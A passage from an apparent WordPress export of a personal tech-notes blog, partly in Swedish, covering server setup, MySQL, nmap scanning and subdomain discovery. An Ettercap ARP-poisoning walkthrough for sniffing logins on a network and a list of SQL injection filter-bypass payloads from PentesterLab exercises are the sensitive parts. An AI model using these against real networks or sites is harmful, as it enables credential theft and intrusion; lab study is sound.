@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
21:01:12:c2:6c:01:51:0b:ef:19:76:79:d2:87:d0:13.
Please contact your system administrator.
Add correct host key in /home/user/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/user/.ssh/known_hosts:11
  remove with: ssh-keygen -f &quot;/home/user/.ssh/known_hosts&quot; -R 192.168.1.101
Password authentication is disabled to avoid man-in-the-middle attacks.
Keyboard-interactive authentication is disabled to avoid man-in-the-middle attacks.
Permission denied (publickey,password).

[/code]
Okay so that didn't work. So let's run the command that the error-message suggest.

[code lang="bash"]
ssh-keygen -f &quot;/home/user/.ssh/known_hosts&quot; -R 192.168.1.101
[/code]

And now we can log in without any problems.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>413</wp:post_id>
		<wp:post_date>2016-04-01 20:51:11</wp:post_date>
		<wp:post_date_gmt>2016-04-01 20:51:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>setting-up-ssh-to-ubuntu-server</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21359446215]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>How to install and setup Apache/php/Mysql</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/02/how-to-install-and-setup-apachephpmysql/</link>
		<pubDate>Sat, 02 Apr 2016 22:14:16 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=439</guid>
		<description></description>
		<content:encoded><![CDATA[
<h2>Installing Apache</h2>
So first we are going to install Apache. Which is really easy.

[code lang="bash"]
sudo apt-get update
sudo apt-get install apache2
[/code]

Yeah, it is that easy. I am running the server on a VM (that I have configured to Bridged Adapter i the network-settings) so that it can connect to my network.

Now I can reach the inital page create by apache at the address of the servers internal ip (that looks something like this: 192.168.1.101). The page we see is just a "Your server is working"-page by apache. You can find it and remove it, or change it in /var/www/html.

But it could be a bit enoying having to write out the internal IP-address every time we want to visit the servers page. So we can give it a name by changing the config file in /etc/hosts on the host-computer. 

[code lang="bash"]
sudo vim /etc/hosts
#Here we just add the internal IP-address of the server, and then we make a tab (now several spaces) and then the name. Like this:
192.168.1.101    mylocalhomepage.dev
[/code]
Now we only need to restart the network service
[code lang="bash"]
sudo /etc/init.d/networking restart
[/code]

And now we can view the apache-page on mylocalhomepage.dev

To develop with apache it can be quite annoying to always have to write sudo before writing in any file in /var/www/html.
There are two ways to solve this.
1. Change the permission of the dir /var/www/html.
2. Change the root-directory. So that apache looks elsewhere. Let's do that.

Go to:
[code lang="bash"]
#Let's first make a backup in case we mess up somewhow.
sudo cp 000-default.conf 000-default.conf.backup
#Then we edit the file to the following:
sudo vim /etc/apache2/sites-available/000-default.conf
DocumentRoot /home/yourUsername/www
[/code]
This is a really strange name of the conf-file to me, but whatever. Now we need to change one more file and we are good to go.

[code lang="bash"]
#Make a copy. I like to have the original to look at if something happens.
sudo cp /etc/apache2/apache2.conf /etc/apache2/apache2.conf.backup
sudo vim /etc/apache2/apache2.conf

#Change this part
&lt;Directory /home/yourUser/www/&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
&lt;/Directory&gt;
#Then we restart apache so the changes take effect
sudo service apache2 restart
[/code]

Now you can create a file in /home/yourUser/www called index.html and you will see it if you go to localhost.
I managed to ess something up and the googeling solution for a long time. 

<h2>Installing PHP5</h2>
[code lang="bash"]
sudo apt-get install php5 libapache2-mod-php5 php5-mcrypt
[/code]

Now you should be able to use apache as your server and render php-files. Create a file called index.php in your apache-root folder.

[code lang="html"]
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;PHP-page&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;

  &lt;?php
    echo &quot;test if php is working&quot;;
  ?&gt;

  &lt;/body&gt;
&lt;/html&gt;

[/code]

The php-code should be rendered on the serverside and output "test if php is working". If the code is put in a html-comment, it means that php is not working and active. And you will have to troubleshoot it. 

<h2>MySQL</h2>
Soon!
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>439</wp:post_id>
		<wp:post_date>2016-04-02 22:14:16</wp:post_date>
		<wp:post_date_gmt>2016-04-02 22:14:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>how-to-install-and-setup-apachephpmysql</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21391632376]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>MySQL Commands</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/02/mysql-commands/</link>
		<pubDate>Sat, 02 Apr 2016 22:48:01 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=511</guid>
		<description></description>
		<content:encoded><![CDATA[This is a list of MySQL Commands that I don't feel like googeling again.

MySQL-commands are not case sensitive, so you can write it in lowercase if you like. But the commands are usually written in uppercase and  and tables, databases, usernames are written in lowercase.

All commands have to end in a semicolon. ;;;;;;;;;;;
<strong>Create database</strong>
[code]
CREATE DATABASE nameofdatabase;
[/code]


<strong>Show database</strong>
[code]
SHOW DATABASES;
[/code]

<strong>Delete database</strong>
[code]
DROP DATABASE nameofdatabase;
[/code]

<strong>Open a database</strong>
[code]
USE nameofdatabase;
[/code]

<strong>Show tables of a database</strong>
[code]
SHOW tables;
[/code]

<strong>Create a table</strong>
So when you create a table you have to give it at least one column, and that column need to have the data type specified. Here is a <a href="http://www.tutorialspoint.com/mysql/mysql-data-types.htm">list of common data types.</a>
[code]
CREATE TABLE nameoftable (nameOfColumn TYPE, nameOfColumn TYPE);
[code]
For example:
[code]
CREATE TABLE users (username VARCHAR);
[/code]

<strong>Show a list of tables</strong>
[code]
SHOW TABLES;
[/code]

<strong>Show a description of the table</strong>
[code]
DESCRIPTION nameoftable;
[/code]

<strong>Insert data into table</strong>
[code]
INSERT INTO `nameoftable` (`name`) VALUES (&amp;quot;Pelle&amp;quot;);
[/code]

<strong>Look at the data in the table</strong>
[code]
SELECT * FROM nameoftable;
[/code]

<strong>Update a field in the table</strong>
[code]
UPDATE `users` SET `name` = 'Johan' WHERE `users`.`name` ='Pelle';
[/code]

<strong>Add column to a table</strong>
[code]
ALTER TABLE users ADD email VARCHAR(40);
[/code]

<strong>Remove column from table</strong>
[code]
ALTER TABLE users DROP email;
[/code]

<strong>Remove row from table</strong>
Let's say we want to remove a user from our table
[code]
DELETE from users where name=Johan;
[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>511</wp:post_id>
		<wp:post_date>2016-04-02 22:48:01</wp:post_date>
		<wp:post_date_gmt>2016-04-02 22:48:01</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>mysql-commands</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21392326586]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ways to find out subdomains</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/03/ways-to-find-out-subdomains/</link>
		<pubDate>Sun, 03 Apr 2016 18:08:29 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=542</guid>
		<description></description>
		<content:encoded><![CDATA[There are a few different ways to find out subdomains of a specific site. None of them can guarantee that you will find all subdomains. So you will probably have to use several different tools.

<strong>Google Dorks</strong>
You can use google. With this type of search you will find some of the 
site:*.example.com/ -site:www.example.com

<strong>Online tools</strong>

<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a>
<a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a>

<strong>SubBrute</strong>
SubBrute is a python-program that bruteforces the subdomains. It can be quite useful.

<a href="https://github.com/TheRook/subbrute">Github repo</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>542</wp:post_id>
		<wp:post_date>2016-04-03 18:08:29</wp:post_date>
		<wp:post_date_gmt>2016-04-03 18:08:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ways-to-find-out-subdomains</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_0d724ec151d31f3b1c91e9b192f7b692</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_230e6e5458de0416b0ac5641d2e6fe8a</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21415941538]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>How to solve Apt-get update error</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/05/how-to-solve-apt-get-update-error/</link>
		<pubDate>Tue, 05 Apr 2016 17:14:42 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=562</guid>
		<description></description>
		<content:encoded><![CDATA[So recently I have had some problems Advanced Package Tool, better known as APT. The popular linux package manager.

I have received the following errors when I have run [code lang="bash"]sudo apt-get update[/code].

[code lang="bash"]
W: Failed to fetch http://archive.ubuntu.com/ubuntu/dists/trusty/Release Unable to find expected entry 'universe/source/Sources' in Release file (Wrong sources.list entry or malformed file)
[/code]

I tried to regenerate the sources.list several times. By removing it and then running apt-get update again. I also read about a million posts on askubuntu and stack overflow.

In the end, the fix for me was to generate a new source.list. This is the tool I used to create a new source.list file.

<a href="https://repogen.simplylinux.ch/">https://repogen.simplylinux.ch</a>
You then just copy-paste it and add it to /etc/apt/sources.list
Then I ran [code lang="bash"]sudo apt-get update[/code]
But that threw a lot of errors. So I ran, as apt suggested, [code lang="bash"]sudo apt-get update --fix-missing[/code]

And that fixed the whole issue, at least for now.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>562</wp:post_id>
		<wp:post_date>2016-04-05 17:14:42</wp:post_date>
		<wp:post_date_gmt>2016-04-05 17:14:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>how-to-solve-apt-get-update-error</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="apt"><![CDATA[apt]]></category>
		<category domain="post_tag" nicename="error"><![CDATA[error]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[linux]]></category>
		<category domain="post_tag" nicename="ubuntu"><![CDATA[ubuntu]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_9b000067aa640e4ef4956ddfcdda3e52</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21483324526]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Nmap commands</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/07/nmap-commands/</link>
		<pubDate>Thu, 07 Apr 2016 14:42:09 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=589</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Find hosts/devices on the network</h2>

nmap -sP 192.168.0.1/24
To find out what devices are on the network you need to know the ip of the router.
Here are some common:
10.0.1.1
10.0.0.2
10.0.0.138
192.168.0.1
192.168.1.1
192.168.1.10.1
192.168.11.1
192.168.2.1
192.168.3.1
192.168.1.254
192.168.254.254

<a href="http://www.techspot.com/guides/287-default-router-ip-addresses/">Here</a> is a more complete list, and according to model.
For default usernames and passwords check <a href="http://www.routeripaddress.com/">here</a>.

<h2>Scan for open ports</h2>
The most simple of commands to check for some standard ports is:
[code lang="bash"]
nmap 192.168.0.103
[/code]
But that does not check all of the possible ports.
[code lang="bash"]
nmap -p 1-65535 192.168.0.164
[/code]
Or decide what ports you do want to check.

<h2>Check what service uses a specific port</h2>
Let's say we find some open ports. But the port is either to high to have a specific service. Or it is on a port that is not usually used for it. For example, a lot of people are moving their ssh to not be port 22 to avoid spam-attacks.
[code lang="bash"]
45061/tcp open  unknown
[/code]

So we just add the -sV flag.
[code]
sudo nmap -sV -p 45061 192.168.1.103
[/code]

Here is the <a href="https://nmap.org/book/man-version-detection.html">Nmap-documentation</a> for it.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>589</wp:post_id>
		<wp:post_date>2016-04-07 14:42:09</wp:post_date>
		<wp:post_date_gmt>2016-04-07 14:42:09</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>nmap-commands</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="nmap"><![CDATA[nmap]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21550400670]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ettercap - MiTM</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/12/16/ettercap-mitm/</link>
		<pubDate>Wed, 16 Dec 2015 04:57:55 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=680</guid>
		<description></description>
		<content:encoded><![CDATA[1. Ladda ner och installera Kali linux.
2. Innan vi öppnar ettercap så måste vi göra vissa konfigureringar.
    - Öppna /etc/ettercap/ettercap.conf
    -  Scrolla ner till och ändra till följande
[code]
[privs]
ec_uid = 0 #65534
ec_gid = 0 #65534
[/code]

Och kommentera sedan ut under sektionen redir_command_on/off.

Linux
kommentera ut
if you use ip-tables
[code]
redir_command_on = &quot;iptables -t...&quot;
redir_command_on = &quot;iptables -t...&quot;
[/code]

3. Öppna upp Ettercap gui.
4. Klicka på "Sniff" och sedan på "Unified snffing", sedan väljer du nätverksinterface.
5. Klicka på Scan for hosts, under Hosts. Du kan behöva scanna fler gånger för att få upp alla maskiner som är uppkopplade mot nätverket.
6. Klicka sedan på routern (192.168.1.1) å sen target 1 sedan victim-datorn target 2. Om du inte väljer några targets så kommer alla att MiTMlas. Vilket kan vara påfrestande för nätverket.
7. Klicka på MiTM och sedan Arp poisining, och sedan kryssa i Sniff remote connections.
8. Klicka på Start, och sedan Start sniffing.
9. Nu kommer Ettercap att registrera alla användarnamn och lösenord som skrivs in. Givet att dom skrivs in i HTTP och inte i HTTPS.
Attacken är inte speciellt lyckad eftersom moderna webbrowsers säger till varje gång man besöker en https-sajt, den säger då till och varnar för att nån sniffar trafiken. 
10. För att testa om det verkligen fungerar så kan du gå in på familjeliv.se och testa logga in. Du behöver inte ens logga in, utan bara skriva in ett fejkat användarnamn och lösen.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>680</wp:post_id>
		<wp:post_date>2015-12-16 04:57:55</wp:post_date>
		<wp:post_date_gmt>2015-12-16 04:57:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ettercap-mitm</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[17840222356]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[680]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[680]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>tmux och irssi</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/12/23/tmux-och-irssi/</link>
		<pubDate>Wed, 23 Dec 2015 00:08:46 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=714</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Tmux</h1>

För att kunna kunna idla på irc 24/7 behöver man en server som jämnt är online, irssi och tmux.

Logga in på serverns med ssh.
Ladda ner irssi och tmux.
sudo apt-get install irssi tmux
Starta en ny session med tmux genom kommandot:
tmux
Öppna irc med kommandot:
irssi
joina en server och en kanal.
/connect irc.freenode.net
/join #namnpåkanal

För att sedan kunna gå ur å komma in igen å läsa all historik så kör kommandot:
ctrl a
ctrl d
crt-b D

För att sedan gå ut ur alla tmux-sessioner så kör du.
ctrl-d
För att sedan hoppa in på en ny session igen så kör du
tmux list-sessions
tmux attach -t 0 (eller vad sessionen nu heter)
ctr-b p - för att gå över till nästa panel
ctr-b , - för att renamea ett fönster]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>714</wp:post_id>
		<wp:post_date>2015-12-23 00:08:46</wp:post_date>
		<wp:post_date_gmt>2015-12-23 00:08:46</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>tmux-och-irssi</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[18044747863]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[714]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[714]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Pentester Lab - SQL</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/12/30/pentester-lab-sql/</link>
		<pubDate>Wed, 30 Dec 2015 16:16:50 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=726</guid>
		<description></description>
		<content:encoded><![CDATA[https://pentesterlab.com/exercises/web_for_pentester/course

3. Här kan vi iof skriva:
?name=root'or'1'='1
Utan några mellanrum. Men ponera att även det är blockat, då kan vi använda oss av SQL-kommentarer.
?name=root'/**/or/**/'1'='1

4. Här ser vi alltså att någon har börjat försvara sig.
?id=1 or 1=1
vi kan även göra
?id=1+1 (fast ?id=1%2B1)

5.Här har admin försökt försvara sig genom ett regex. Men det funkar inte så bra. Tidigare exploits funkar på denna.

6.Här är regexet också dåligt. Nu måste stringen avslutas med en int. vilket är enkelt att göra.
?id=1 or 1=1
ett annat sätt är att köra
?id=1 or 1=1 #3

7. Här måste vi lägga till new line, eftersom regexen inte checkar för det.
?id=1%0A or 1=1
%0A är url-encodningen för n

8.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>726</wp:post_id>
		<wp:post_date>2015-12-30 16:16:50</wp:post_date>
		<wp:post_date_gmt>2015-12-30 16:16:50</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pentester-lab-sql</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[18252353099]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[726]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[726]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0eee65a0cc3073449f31e1f5b08b926c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_7ffcbfe5f95de6259f39f61335c8c0b9</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Deploya en app - Olika sätt</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/02/12/deploya-en-app-olika-satt/</link>
		<pubDate>Fri, 12 Feb 2016 13:24:05 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=756</guid>
		<description></description>
		<content:encoded><![CDATA[https://www.digitalocean.com/community/tutorials/how-to-set-up-automatic-deployment-with-git-with-a-vps
1. Logga in på VPS.
2. Skapa <strong>git init --bare</strong> i vps.
3. Gå till hooks, skapa filen post-receive 
4. Lägg till följande
[code lang="bash"]
#!/bin/sh
git --work-tree=/var/www/domain.com --git-dir=/var/repo/site.git checkout -f
[/code]
5. chmod +x post-receive
6. git remote add live ssh://user@mydomain.com/var/repo/site.git
7. git push live master
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1675</wp:post_id>
		<wp:post_date>2016-02-12 13:24:05</wp:post_date>
		<wp:post_date_gmt>2016-02-12 13:24:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>deploya-en-app-olika-satt</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[19732090350]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[756]]></wp:meta_value>
